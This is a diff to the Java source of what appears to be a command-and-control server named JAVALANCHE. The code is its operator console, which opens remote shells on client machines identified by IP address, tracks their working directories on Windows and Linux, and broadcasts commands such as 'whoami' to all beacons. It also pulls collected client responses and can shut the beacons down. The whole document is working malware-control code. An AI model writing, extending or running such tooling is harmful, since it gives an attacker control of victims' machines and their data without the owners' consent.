@@ -249,6 +249,7 @@ public class C2ServerUserHandler implements Runnable{
         if(clientIP.equals("q")){
             currentUserPath = "";
         } else {
+            String clientOS = C2server.getClientOS(clientIP);
             System.out.println("Setting up Shell ... \n");
 
             // Empty the Message Queue
@@ -258,40 +259,43 @@ public class C2ServerUserHandler implements Runnable{
                 }
             }
 
-            C2server.getShellResponse("Shell " + clientIP + "_pwd");
-
-            String currentDirectory = "C:\\";
-            
-            // readMessages variable is used to ensure that only the results of the command run are output to the user
-            ArrayList<String> readMessages;
-
-            ArrayList<String> tempReadMessagesList;
+            String currentDirectory;
 
             // messages is used to store all client responses
-            Object messages[];
+            ArrayList<String> messages;
+            int numMessagesRead;
     
-            // Iterate through each message returned from the client, starting at the end, to find the current directory
-            synchronized(messageQueue){
-                messages = messageQueue.toArray();
-                messageQueue.removeAll(messageQueue);
+            currentDirectory = "";
+            if(clientOS.equals("Windows")){
+                currentDirectory = "C:\\";
+            } else if(clientOS.equals("Linux")){
+                currentDirectory = "/";
+            }
 
-                // Initialize the readMessages ArrayList with all of the messages already in the client responses
-                readMessages = new ArrayList<>();
-                for(Object message : messages){
-                    readMessages.add(message.toString());
+            // Determine how many responses the client already has
+            numMessagesRead = C2server.getClientResponses(clientIP).get(clientIP).size();
+
+            // Send pwd so that we can get the current directory
+            C2server.getShellResponse("Command " + clientIP + "_pwd");
+
+            // Iterate through all messages we haven't read already, and see if there is a directory in any of them
+            messages = C2server.getClientResponses(clientIP).get(clientIP);
+            
+            for(int i = numMessagesRead; i < messages.size(); i++){
+                if(messages.get(i).contains("C:\\")){
+                    try{
+                        currentDirectory = messages.get(i).split("\n")[2];
+                    } catch (ArrayIndexOutOfBoundsException e){
+                        e.printStackTrace();
+                    }
+                    break;
                 }
-
-                for(int i = messages.length - 1; i > 0; i--){
-                    if(messages[i].toString().contains("C:\\")){
-                        currentDirectory = messages[i].toString().trim().split(" ")[1];
-                        break;
-                    }
-                    else if(messages[i].toString().contains("/")){
-                        currentDirectory = messages[i].toString().trim().split(" ")[1];
-                        break;
-                    }
+                else if(messages.get(i).contains("/")){
+                    currentDirectory = messages.get(i);
+                    break;
                 }
             }
+            numMessagesRead = messages.size();
 
             String command;
             Boolean runCommand;
@@ -349,7 +353,17 @@ public class C2ServerUserHandler implements Runnable{
                                 command = "ls " + currentDirectory + "/";
                             } else {
                                 // Windows
-                                command = "ls " + currentDirectory + "\\";
+                                if(currentDirectory.equals("C:")){
+                                    command = "ls " + currentDirectory + "\\\\";
+                                } else if(currentDirectory.toLowerCase().equals("c:\\windows")){
+                                    System.out.println("We don't recomment printing C:\\Windows, it will crash the client lol");
+                                    runCommand = false;
+                                } else if(currentDirectory.toLowerCase().equals("c:\\windows\\system32")){
+                                    System.out.println("We don't recomment printing C:\\Windows\\System32, it will crash the client lol");
+                                    runCommand = false;
+                                } else {
+                                    command = "ls \\\"" + currentDirectory + "\\\"";
+                                }
                             }
                         } else if (command.equals("ls -la")){
                             // List items with extra details of current directory
@@ -358,7 +372,7 @@ public class C2ServerUserHandler implements Runnable{
                                 command = "ls -la " + currentDirectory + "/";
                             } else {
                                 // Windows
-                                command = "ls -la " + currentDirectory + "\\";
+                                command = "ls -la " + currentDirectory;
                             }
                         } else if (command.substring(0,2).equals(".\\")){
                             // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
@@ -375,30 +389,15 @@ public class C2ServerUserHandler implements Runnable{
 
                         if(runCommand){
                             // Send the Command
-                            C2server.getShellResponse("Shell " + clientIP + "_" + command);
+                            C2server.getShellResponse("Command " + clientIP + "_" + command);
 
-                            // Get all messages
-                            messages = messageQueue.toArray();
-                            messageQueue.removeAll(messageQueue);
-
-                            // Store all of the messages just received in a new temp list
-                            tempReadMessagesList = new ArrayList<>();
-                            for(Object message : messages){
-                                tempReadMessagesList.add(message.toString());
+                            messages = C2server.getClientResponses(clientIP).get(clientIP);
+                            for(int i = numMessagesRead; i < messages.size(); i++){
+                                System.out.println();
+                                System.out.println(messages.get(i));
+                                System.out.println();
                             }
-
-                            System.out.println();
-                            // Iterate through responses and print only ones that are new
-                            for(Object message : messages){
-                                if(!(readMessages.contains(message.toString()))){
-                                    System.out.println(message.toString().substring(message.toString().indexOf(".") + 1));
-                                }
-                            }
-
-                            // Replace the old already read messages list with the new one saved from earlier
-                            if(!(tempReadMessagesList.isEmpty())){
-                                readMessages = tempReadMessagesList;
-                            }
+                            numMessagesRead = messages.size();
                         }
                     }
                 } catch (StringIndexOutOfBoundsException e){
@@ -412,7 +411,7 @@ public class C2ServerUserHandler implements Runnable{
         // Waiting for traffic
         System.out.println();
         System.out.println("Waiting for response...");
-        Thread.sleep(7000);
+        Thread.sleep(3000);
         System.out.println();
     }
 
@@ -473,10 +472,9 @@ public class C2ServerUserHandler implements Runnable{
                 printJAVALANCHE();
                 System.out.println("1. Send a command to all Clients");
                 System.out.println("2. Enter a Shell");
-                System.out.println("3. Launch an Attack Chain");
-                System.out.println("4. Request Data from Clients");
-                System.out.println("5. Get Status from Clients");
-                System.out.println("6. Exit CLI / Close Servers");
+                System.out.println("3. Request Data from Clients");
+                System.out.println("4. Get Status from Clients");
+                System.out.println("5. Exit CLI / Close Servers");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
@@ -485,18 +483,20 @@ public class C2ServerUserHandler implements Runnable{
                 } else if(userInput.equals("2")){
                     currentUserPath = "Shell";
                 } else if(userInput.equals("3")){
-                    currentUserPath = "AttackChain";
-                } else if(userInput.equals("4")){
                     currentUserPath = "Request";
-                } else if(userInput.equals("5")){
+                } else if(userInput.equals("4")){
                     currentUserPath = "Status";
-                } else if(userInput.equals("6")){
-                    System.out.println(RED + "Closing Server..."+ RESET);
-                    System.out.println();
-                    C2server.stopServer();
-                    C2server.broadcastToBeacons("quit");
-                    break;
-                } else {
+                } else if(userInput.equals("5")){
+                    System.out.print("Confirm shutdown of Server [y/N] >> ");
+                    String confirmation = userInputScanner.nextLine();
+                    if(confirmation.toLowerCase().equals("y")){
+                        System.out.println(RED + "Closing Server..."+ RESET);
+                        System.out.println();
+                        C2server.stopServer();
+                        C2server.broadcastToBeacons("quit");
+                        break;
+                    }
+                }  else {
                     System.out.println("Invalid Input");
                 }
             } else if(currentUserPath.equals("Command")){
@@ -689,31 +689,44 @@ public class C2ServerUserHandler implements Runnable{
                 userInput = userInputScanner.nextLine();
 
                 // Request from all Windows Boxes
+                int count = 1;
                 if(userInput.equals("1")){
-                    String OS = "Windows";
-                    C2server.broadcastToBeacons("Request " + OS + "_ ");
-                    try {
-                        waitForResponse();
-                    } catch (InterruptedException e) {e.printStackTrace();}
-
+                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses("Windows");
+                    for(String ip : clientResponses.keySet()){
+                        System.out.println(ip);
+                        System.out.println();
+                        for(String response : clientResponses.get(ip)){
+                            System.out.println(count + ".");
+                            System.out.println(response);
+                            System.out.println();
+                            count++;
+                        }
+                    }
                 // Request from all Linux Boxes
                 } else if (userInput.equals("2")){
-                    String OS = "Linux";
-                    C2server.broadcastToBeacons("Request " + OS + "_ ");
-                    try {
-                        waitForResponse();
-                    } catch (InterruptedException e) {e.printStackTrace();}
-
+                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses("Linux");
+                    for(String ip : clientResponses.keySet()){
+                        for(String response : clientResponses.get(ip)){
+                            System.out.println(count + ".");
+                            System.out.println(response);
+                            System.out.println();
+                            count++;
+                        }
+                    }
                 // Request from single IP
                 } else if (userInput.equals("3")){
                     // Ask user for IP
                     System.out.print("Enter IP Address for desired request >> ");
                     String IPAddress = userInputScanner.nextLine();
-                    C2server.broadcastToBeacons("Request " + IPAddress + "_ ");
-                    try {
-                        waitForResponse();
-                    } catch (InterruptedException e) {e.printStackTrace();}
-                
+                    HashMap<String, ArrayList<String>> clientResponses = C2server.getClientResponses(IPAddress);
+                    for(String ip : clientResponses.keySet()){
+                        for(String response : clientResponses.get(ip)){
+                            System.out.println(count + ".");
+                            System.out.println(response);
+                            System.out.println();
+                            count++;
+                        }
+                    }
                 // Return to home menu
                 } else if (userInput.equals("4")){
                         currentUserPath = "";
@@ -723,10 +736,13 @@ public class C2ServerUserHandler implements Runnable{
 
             // Get Client Status Data
             } else if(currentUserPath.equals("Status")){
-                C2server.broadcastToBeacons("Status All_ ");
+                C2server.broadcastToBeacons("Command Windows_whoami");
+                C2server.broadcastToBeacons("Command Linux_whoami");
+                
                 try {
                     waitForResponse();
                 } catch (InterruptedException e) {e.printStackTrace();}
+                System.out.println(C2server.getClientStatus());
                 currentUserPath = "";
             }
         }
